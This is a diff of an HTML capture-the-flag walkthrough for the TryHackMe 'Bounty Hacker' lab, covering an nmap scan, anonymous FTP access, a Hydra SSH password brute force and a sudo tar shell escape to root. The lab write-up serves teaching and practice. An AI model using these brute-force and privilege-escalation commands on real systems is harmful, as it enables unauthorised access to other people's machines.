@@ -6,42 +6,82 @@
     <title>Bounty Hacker Walkthrough</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #111; /* Dark background */
-            color: #eee; /* Light text */
+            font-family: 'Arial', sans-serif;
+            background-color: #111;
+            color: #eee;
+            line-height: 1.6;
             padding: 20px;
         }
         h1, h2, h3, h4 {
-            color: #eee; /* Light headers */
+            color: #4CAF50;
+            border-bottom: 2px solid #444;
+            padding-bottom: 5px;
         }
         pre {
-            background-color: #222; /* Dark grey for code blocks */
-            color: #ccc; /* Light text in code blocks */
+            background-color: #222;
+            color: #ccc;
             padding: 10px;
             border-radius: 5px;
             overflow-x: auto;
+            font-family: 'Courier New', monospace;
         }
         a {
-            color: #4CAF50; /* Green link color */
+            color: #4CAF50;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        nav {
+            background: #333;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+        nav a {
+            margin: 0 10px;
+            color: #eee;
+        }
+        .icon {
+            margin-right: 5px;
+        }
+        .step {
+            margin-bottom: 20px;
+        }
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 0.8em;
+            color: #aaa;
         }
     </style>
 </head>
 <body>
+    <nav>
+        <a href="#introduction">Introduction</a>
+        <a href="#step1">Step 1: Network Scanning</a>
+        <a href="#step2">Step 2: Enumeration with FTP</a>
+        <a href="#step3">Step 3: Brute Forcing SSH</a>
+        <a href="#step4">Step 4: Privilege Escalation</a>
+        <a href="#step5">Step 5: Root Flag</a>
+    </nav>
+
     <h1>Bounty Hacker CTF on TryHackMe</h1>
 
-    <h2>Introduction</h2>
-    <p>You boasted about your elite hacker skills in a bar, and now a group of Bounty Hunters challenges you to prove it.</p>
+    <div class="step" id="introduction">
+        <h2>Introduction</h2>
+        <p>You boasted about your elite hacker skills in a bar, and now a group of Bounty Hunters challenges you to prove it.</p>
+    </div>
 
-    <h2>Step 1: Getting Started with Network Scanning with NMAP</h2>
-    <pre>
-        nmap -A $IP
-    </pre>
-    <p>We start by scanning the network using NMAP with aggressive mode to gather information about open ports and services.</p>
-
-    <h3>Results:</h3>
-    <pre>
+    <div class="step" id="step1">
+        <h2>Step 1: Getting Started with Network Scanning using NMAP</h2>
+        <pre>
 ┌──(root㉿rex)-[/home/rexadmin]
 └─# nmap -A 10.10.253.164
+        </pre>
+        <p>We start by scanning the network using NMAP with aggressive mode to gather information about open ports & services.</p>
+        <h3>Results:</h3>
+        <pre>
 Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org/) ) at 2024-02-09 21:19 IST
 Nmap scan report for 10.10.253.164
 Host is up (0.33s latency).
@@ -83,13 +123,15 @@ HOP RTT       ADDRESS
 4   331.60 ms 10.10.253.164
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 70.23 seconds
-    </pre>
+Nmap done: 1 IP address (1 host up) scanned in 70.23 seconds.
+        </pre>
+    </div>
 
-    <h2>Step 2: Start Enumeration with FTP</h2>
-    <pre>
- ┌──(root㉿rex)-[/home/rexadmin/ctf]
- └─# ftp 10.10.253.164
+    <div class="step" id="step2">
+        <h2>Step 2: Enumeration with FTP</h2>
+        <pre>
+┌──(root㉿rex)-[/home/rexadmin/ctf]
+└─# ftp 10.10.253.164
 Connected to 10.10.253.164.
 220 (vsFTPd 3.0.3)
 Name (10.10.253.164:rexadmin): anonymous
@@ -97,8 +139,11 @@ Name (10.10.253.164:rexadmin): anonymous
 Remote system type is UNIX.
 Using binary mode to transfer files.
 
-<h2>You are in!</h2>
-
+        </pre>
+        <p>You're in successfully as anonymous.</p>
+        <h3>Let's see what's inside the FTP server:</h3>
+        <pre>
+ftp> ls
 ftp> ls
 200 EPRT command successful. Consider using EPSV.
 150 Here comes the directory listing.
@@ -106,7 +151,11 @@ ftp> ls
 -rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
 226 Directory send OK.
 
-<h2>We can see two files in pwd. And, we have to see what is on’em.</h2>
+
+
+
+#We can see two files in pwd. Let's see what's on them.
+
         
 ftp> get task.txt
 local: task.txt remote: task.txt
@@ -126,47 +175,61 @@ local: locks.txt remote: locks.txt
 226 Transfer complete.
 418 bytes received in 00:00 (1.00 KiB/s)
 
-**Both files** task.txt and locks.txt downloaded! 
+  </pre>
+        <p>Both <code>task.txt</code> and <code>locks.txt</code> downloaded!</p>
+        <h3>Now, cat task.txt and you will get the flag for Q3. 
+And, save both of these files, they can be or might be used later, who knows.</h3>
+    </div>
 
- <h2>Now, cat task.txt and you will get the flag for Q3. 
-And, save both of these files, they can be or might be be used later, who knows.</pre>
-    
-      <h2>Step 3:Next Flag</h2>
-        <pre>
-     <h2>Now, you have to answer the Q4: **What service can you bruteforce with the text file found?**</h2>
+    <div class="step" id="step3">
+        <h2>Step 3: Next Flag</h2>
+        <p>Now, you need to answer: <strong>What service can you bruteforce with the text file found?</strong>
 
-<p>This question has two answers, as we can try to brute force the FTP server, well, seems like no use. 
-Then the second one is SSH. And, we got our guy!
+</p>This question has two answers, as we can try to brute force the FTP server, well, seems like of no use. 
+</p>Then the second one is SSH. And, we got our guy!
 Now, you are almost done the half of the room! 
-You can become an elite hacker in the future, just carry on and be persistent.</p></pre>
-  
-<h2>Step 4: Brute Forcing SSH</h2>
-    <pre>   
- <p> Do you know what is the users password?
+</p>You can become an elite hacker in the future, just carry on and be persistent.
+</p>
+        
+
+    </div>
+
+    <div class="step" id="step4">
+        <h2>Step 4: Brute Forcing SSH</h2>
+        <p>Utilize <code>Hydra</code> to find the password:</p>
+        <pre>
+ Do you know what is the users password?
 
 To find it you first have to consider the available credentials and if the doesn’t work, then you can  think further!
 What we have right now is: 
 
-- 3 open port
+- 3 open ports
 - 1 task.txt file which contains a name that might be a user.
 - 1 locks.txt file which has a wordlist that might be the passwords.
 
-Now, to find the password of the users, you can use a password brute-forcer like Hydra. </p>
+Now, to find the password of the users, you can use a password brute-forcer like Hydra. 
 
-#Command: <p> hydra -l lin -P locks.txt 10.10.253.164 ssh  </p>
 
-<h4>Command Description:</h4> 
+
+#Command: 
+ hydra -l lin -P locks.txt 10.10.253.164 ssh  
+
+
+
+Command Description:
+ 
 
 Here's a breakdown of the command:
-<pre>
 - hydra: invokes the Hydra password-cracking tool
 - -l lin: specifies the username to use for the attack
 - -P locks.txt: specifies the file containing a list of passwords to try
 - 10.10.253.164: specifies the IP address of the SSH server to attack
 - ssh: specifies the protocol to use for the attack (in this case, SSH)
-</pre>
-<h4>Now, hit that command!</h4> </p>
- <pre>
+
+Now, hit that command!
+ 
+
+ 
 ┌──(root㉿rex)-[/home/rexadmin/ctf]
 └─# hydra -l lin -P locks.txt 10.10.253.164 ssh
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -179,165 +242,69 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-09 23:36:
 
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-09 23:36:14
-       </pre>
+        </pre>
+        <p>Now, SSH into the server using the obtained credentials!
 
-<p>#Now, we have a user and his password. Let’s now try to ssh via these credentials.</p>
+#Now, we have a user and his password. Let’s now try to ssh via these credentials.
+
+
+<code>        
+</p>┌──(root㉿rex)-[/home/rexadmin/ctf]
+</p>└─# ssh lin@10.10.253.164
+
+</p>The authenticity of host '10.10.253.164 (10.10.253.164)' can't be established.
+ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
+This key is not known by any other names.
+</p>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</p>Warning: Permanently added '10.10.253.164' (ED25519) to the list of known hosts.
+</p>lin@10.10.253.164's password:
+</p>Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)
+
+</p>- Documentation: [https://help.ubuntu.com](https://help.ubuntu.com/)
+</p>- Management: [https://landscape.canonical.com](https://landscape.canonical.com/)
+</p>- Support: https://ubuntu.com/advantage
+
+</p>83 packages can be updated.
+0 updates are security updates.
+
+</p>Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
+</p>lin@bountyhacker:~/Desktop$ ls
+</p>user.txt</p>
+ </code>
+   </div>
+
+<p>You got the user flag.
+</p>
+
+
+    <div class="step" id="step5">
+        <h2>Step 5: Escalating Privileges</h2>
+        <p>After logging in, check your sudo privileges:</p>
         <pre>
-┌──(root㉿rex)-[/home/rexadmin/ctf]
-└─# ssh lin@10.10.253.164
-
-The authenticity of host '10.10.253.164 (10.10.253.164)' can't be established.
-ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.10.253.164' (ED25519) to the list of known hosts.
-[lin@10.10.253.164](mailto:lin@10.10.253.164)'s password:
-Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)
-
-- Documentation: [https://help.ubuntu.com](https://help.ubuntu.com/)
-- Management: [https://landscape.canonical.com](https://landscape.canonical.com/)
-- Support: https://ubuntu.com/advantage
-
-83 packages can be updated.
-0 updates are security updates.
-
-Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
-lin@bountyhacker:~/Desktop$ ls
-user.txt</pre>  
-<h1>BRAVO! You just got the user flag. Now, you officialy became a HACKER! </h1>
-
-Wait, but actually, we are looking for the users password, right?
-Let’s think about where can be the additional users other than lin…..
-Wait, we just did FTP till now, let’s look for other ports: its HTTP 80.
-But it looks like just a conversation between these guys, they can be the users. 
-
-Lets create a users.txt file and add all the names on it using nano. </p>
-        
-<pre>
-┌──(root㉿rex)-[/home/rexadmin/ctf]
-└─# nano users.txt
-
-
-
-#Add all those names you find on the webpage.
-
-┌──(root㉿rex)-[/home/rexadmin/ctf]
-└─# ls
-locks.txt  rockyou.txt  task.txt  users.txt
-
-
-
-┌──(root㉿rex)-[/home/rexadmin/ctf]
-└─# cat users.txt
-Spike
-Jet
-Ed
-Edward
-Ein
-Faye
-</pre>
-<h1>Step 5: Escalating Privileges</h1>
-<pre> Now, you have to brute force again using Hydra via ssh, because that is all that we’ve got.
-
-#Command: hydra ssh://10.10.253.164 -L users.txt -P locks.txt
-        
-┌──(root㉿rex)-[/home/rexadmin/ctf]
-└─# hydra ssh://10.10.253.164 -L users.txt -P locks.txt
-Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-09 23:46:04
-[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 182 login tries (l:7/p:26), ~12 tries per task
-[DATA] attacking ssh://10.10.253.164:22/
-1 of 1 target completed, 0 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-09 23:46:59</pre>
-
-      <pre>  Unfortunately, we found nothing!
-
-        Wait, are you as dumb as me? We found that user's password earlier. Do you have any guesses?
-
-        Don’t worry! I’ll tell you. This above result shows that there is no user available from that list we created. It means the user is lin himself. Ultimately, the password is the exact one we found before. </pre>
-       
-        <h2>Step 6: Obtaining Root Flag</h2>
-        <p> Now, we have a user lin and his password.
-        We have to find the root flag, so we have to escalate our permissions.
-
-        Let’s log in to the server again via SSH for lin. </p>
-
-        # ssh lin@10.10.253.164
- <pre>
-┌──(root㉿rex)-[/home/rexadmin/ctf]
-└─# ssh [lin@10.10.253.164](mailto:lin@10.10.253.164)
-The authenticity of host '10.10.253.164 (10.10.253.164)' can't be established.
-ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.10.253.164' (ED25519) to the list of known hosts.
-[lin@10.10.253.164](mailto:lin@10.10.253.164)'s password:
-Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)
-
-- Documentation: [https://help.ubuntu.com](https://help.ubuntu.com/)
-- Management: [https://landscape.canonical.com](https://landscape.canonical.com/)
-- Support: https://ubuntu.com/advantage
-
-83 packages can be updated.
-0 updates are security updates.
-
-Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
-lin@bountyhacker:~/Desktop$ </pre>       
-        
-        <p> Now, you have to find out what commands you can run from lin’s access.
-  Hit a command: sudo -l </p>
-
-<pre>lin@bountyhacker:~/Desktop$ sudo -l
-[sudo] password for lin:
-Sorry, try again.
-[sudo] password for lin:
-Matching Defaults entries for lin on bountyhacker:
-env_reset, mail_badpass,
-secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
+lin@bountyhacker:~/Desktop$ sudo -l
 User lin may run the following commands on bountyhacker:
-(root) /bin/tar</pre>
-
-      <p>
-As you can see, we can execute tar as root.
-Now, without wasting any time, let’s get into <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a> and search for tar.
-After you get into that webpage, navigate to a sub-section for SUDO.
-
-        You will find something like this:</p>
-
-      <pre>"'If the binary is allowed to run as a superuser by sudo, the payload below does not drop the elevated privileges and may be used to access the file system, escalate, or maintain privileged access.'"</pre>
-
-        <code>sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code>
-
-        Now, execute this payload.
-
+(root) /bin/tar
+        </pre>
+        <p>Execute the following command for privilege escalation:</p>
         <pre>
-lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
-tar: Removing leading `/' from member names</pre>
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+        </pre>
+        <p>Check your user:</p>
+        <pre>whoami</pre>
+        <p>Congratulations, you are now root!</p>
+    </div>
 
-
-        <p>Now, check who you are by running <code>whoami</code>.</p>
-        
-
+    <div class="step" id="step6">
+        <h2>Step 6: Geting Root Flag</h2>
         <pre>
-lin@bountyhacker:~/Desktop$whoami
-        <code>
-root</code></pre>
+locate root.txt
+cat /root/root.txt
+        </pre>
+        <h1>Felicitaciones! You did it!</h1>
+    </div>
 
-        <pre>$$$ BRAVO! You are now root.
-
-        Now, you have to find the root.txt flag. 
-        To find it on the file system, just run <code>locate root.txt</code>.</pre>
-
-  <pre> #locate root.txt
-        <code>/root/root.txt</code>
-        #cat /root/root.txt
-       
-
-
- <code>XxXxXxXxXxXxXx</code></pre>
-
-       <H1> Felicitaciones! You did it! </H1>
+    <div class="footer">
+        <p>2024 Bounty Hacker CTF Writeup by 0x3w0rldwid3.</p>
+    </div>
 </body>
 </html>
